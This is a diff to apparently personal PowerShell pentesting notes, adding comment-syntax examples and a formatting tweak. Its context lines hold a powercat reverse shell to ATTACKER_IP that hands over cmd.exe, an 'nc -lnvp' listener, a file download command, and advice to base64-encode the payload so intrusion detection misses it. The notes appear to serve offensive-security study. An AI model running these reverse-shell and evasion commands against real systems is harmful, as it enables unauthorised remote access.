@@ -11,6 +11,14 @@ Y
 Get-ExecutionPolicy
 ```
 
+* Comments in `powershell` scripts using `#`, `<#` and `#>`
+```powershell
+# This is a comment
+<#
+This is inside a block comment
+#>
+```
+
 * File Transfer / Downloading with powershell, `new-object` instantiates a new `.NET` framework or `.COM` object, in our case, we are creating an instance of `WebClient` under the namespace of `System.Net`. This class contains a public function, `DownloadFile`, which takes two parameters, source location in the form of a `URI`, and a target location. (where the downloaded file will be stored)
 ```powershell
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://localhost/file','C:\Users\saccharide\Desktop\file')"
@@ -131,7 +139,7 @@ powercat -c ATTACKER_IP -p 1337 -e cmd.exe -g > reverse-shell.ps1
 ./reverse-shell.ps1
 ```
 
-* Since most IDS will be able to detect such simple payload, we can encode it to `base64` with `-e` option, and we can use run it with `powershell -E`
+* Since most `IDS` will be able to detect such simple payload, we can encode it to `base64` with `-e` option, and we can use run it with `powershell -E`
 ```
 Attacker:
 nc -lnvp 1337
